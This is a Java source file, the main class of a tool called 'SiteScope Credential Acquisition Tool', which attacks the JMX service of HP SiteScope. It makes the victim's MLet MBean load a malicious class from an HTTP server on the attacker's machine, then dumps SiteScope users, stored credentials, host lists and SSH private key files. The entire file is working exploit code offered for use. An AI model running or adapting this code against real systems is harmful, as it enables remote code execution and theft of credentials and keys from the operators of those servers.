/*
 * Copyright (C) 2017 hantwister
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
package scat;

import java.lang.reflect.Proxy;
import java.net.Inet6Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.UnknownHostException;
import java.util.Enumeration;
import java.util.HashSet;
import javax.management.InstanceAlreadyExistsException;
import javax.management.MBeanServerConnection;
import javax.management.MBeanServerInvocationHandler;
import javax.management.ObjectInstance;
import javax.management.ObjectName;
import javax.management.loading.MLetMBean;
import javax.management.remote.JMXConnector;
import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXServiceURL;
import scat.mbean.Extractor;
import scat.mbean.ExtractorMBean;
import scat.mlet.HTTPServer;
import scat.pojo.Credential;
import scat.pojo.Host;
import scat.pojo.SiteScopeUser;

/**
 *
 * @author hantwister
 */
public class Main {

    public static void main(String[] args) {
        System.out.println("SiteScope Credential Acquisition Tool (SCAT)");
        System.out.println();

        // Check that a host was provided as an argument
        if (args.length < 1) {
            System.err.println("[-] When running this tool, provide a victim host as an argument.");

            return;
        }

        // Actually try to resolve the IP/hostname/..., avoid obvious errors
        try {
            InetAddress.getByName(args[0]);
        } catch (UnknownHostException e) {
            System.err.println("[-] Could not resolve the host " + args[0]);

            return;
        }

        // Attack the JMX service of HP SiteScope and make sure a malicious bean is loaded
        ExtractorMBean extractorMBean = null;
        try {
            extractorMBean = getExtractorMBean(args[0]);
        } catch (Throwable t) {
            t.printStackTrace();
        }
        if (extractorMBean == null) {
            System.exit(1);
        }

        System.out.println();

        // Display things
        System.out.println("[ ] Obtaining SiteScope users...");
        try {
            for (SiteScopeUser ssu : extractorMBean.getSiteScopeUsers()) {
                System.out.println("[+] " + ssu);
            }
        } catch (Throwable t) {
            t.printStackTrace();
        }
        System.out.println();

        System.out.println("[ ] Obtaining credentials...");
        try {
            for (Credential c : extractorMBean.getCredentials()) {
                System.out.println("[+] " + c);
            }
        } catch (Throwable t) {
            t.printStackTrace();
        }
        System.out.println();

        System.out.println("[ ] Obtaining hosts...");
        HashSet<String> sshKeyFiles = new HashSet<>();
        try {
            for (Host h : extractorMBean.getHosts()) {
                System.out.println();
                System.out.println("[+] " + h);
                if (h.sshKeyFile != null && h.sshKeyFile.trim().length() > 0) {
                    sshKeyFiles.add(h.sshKeyFile);
                }
            }
        } catch (Throwable t) {
            t.printStackTrace();
        }
        System.out.println();

        for (String s : sshKeyFiles) {
            System.out.println("[ ] Attempting to obtain " + s + " SSH keyfile...");
            try {
                for (String l : extractorMBean.getFile(s)) {
                    System.out.println(l);
                }
            } catch (Throwable t) {
                t.printStackTrace();
            }
            System.out.println();
        }

        // Exit (kill the HTTP server if started)
        System.exit(0);
    }

    private static ExtractorMBean getExtractorMBean(String host) throws Throwable {
        // Connect to SiteScope JMX
        System.out.println("[ ] Connecting to the victim's JMX service...");
        JMXServiceURL url = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + host + ":28006/jmxrmi");
        JMXConnector connector = JMXConnectorFactory.connect(url);

        // Connect to MBean Server
        System.out.println("[ ] Connecting to the victim's MBean server...");
        MBeanServerConnection mbeanServer = connector.getMBeanServerConnection();

        // See if the tool has already been run and the malicious MBean is already loaded
        System.out.println("[ ] Checking if malicious class already loaded...");
        try {
            ObjectInstance extractorRef = mbeanServer.getObjectInstance(new ObjectName(Extractor.OBJECT_NAME));
            return (ExtractorMBean) Proxy.newProxyInstance(ExtractorMBean.class.getClassLoader(),
                    new Class[]{ExtractorMBean.class},
                    new MBeanServerInvocationHandler(mbeanServer, extractorRef.getObjectName()));
        } catch (Throwable t) {
        }

        // Start an HTTP Server, which will be used by the victim MLet MBean
        System.out.println("[ ] Starting an HTTP Server to serve malicious class...");
        HTTPServer.startInstance();

        // Get MLet instance
        System.out.println("[ ] Getting reference to MLet MBean...");
        ObjectInstance mLetMBeanRef;
        try {
            mLetMBeanRef = ((MBeanServerConnection) mbeanServer).createMBean("javax.management.loading.MLet", null);
        } catch (InstanceAlreadyExistsException e) {
            mLetMBeanRef = mbeanServer.getObjectInstance(new ObjectName("DefaultDomain:type=MLet"));
        }
        MLetMBean mLetMBean = (MLetMBean) Proxy.newProxyInstance(MLetMBean.class.getClassLoader(),
                new Class[]{MLetMBean.class},
                new MBeanServerInvocationHandler(mbeanServer, mLetMBeanRef.getObjectName()));

        // Have MLet instance load malicious bean from HTTP server
        System.out.println("[ ] Preparing to request MLet MBean load malicious class from HTTP server...");

        // Iterate over IPs until we figure out which one the victim can reach
        Enumeration<NetworkInterface> nis = NetworkInterface.getNetworkInterfaces();
        while (nis.hasMoreElements()) {
            NetworkInterface ni = nis.nextElement();

            Enumeration<InetAddress> ias = ni.getInetAddresses();
            while (ias.hasMoreElements()) {
                InetAddress ia = ias.nextElement();

                if (ia.isLoopbackAddress()) {
                    continue;
                }

                String ip = ia.getHostAddress();

                if (ia instanceof Inet6Address) {
                    ip = "[" + ip + "]";
                }

                System.out.println("[ ] Trying IP " + ip + " for attacker...");

                try {
                    // The method call to load mbeans could throw or return an exception
                    for (Object o : mLetMBean.getMBeansFromURL("http://" + ip + ":" + HTTPServer.HTTP_PORT + "/mlet")) {
                        if (o instanceof ObjectInstance) {
                            // We got a reference to the instantiated class
                            return (ExtractorMBean) Proxy.newProxyInstance(ExtractorMBean.class.getClassLoader(),
                                    new Class[]{ExtractorMBean.class},
                                    new MBeanServerInvocationHandler(mbeanServer, ((ObjectInstance) o).getObjectName()));
                        } else if (o instanceof InstanceAlreadyExistsException) {
                            // This would be an odd situation...
                            System.err.println("[-] Instance already exists, but didn't earlier...");
                            System.err.println("[-] You may not be the only attacker; try re-running the tool.");

                            return null;
                        } else if (o instanceof Throwable) {
                            // Any other error, re-throw
                            throw (Throwable) o;
                        }
                    }
                } catch (Throwable t) {
                    System.err.println("[-] Got " + t.getClass().getName() + " for IP " + ip);
                }
            }

        }

        System.err.println("[-] Couldn't find an IP that the victim could successfully act on.");
        return null;
    }
}
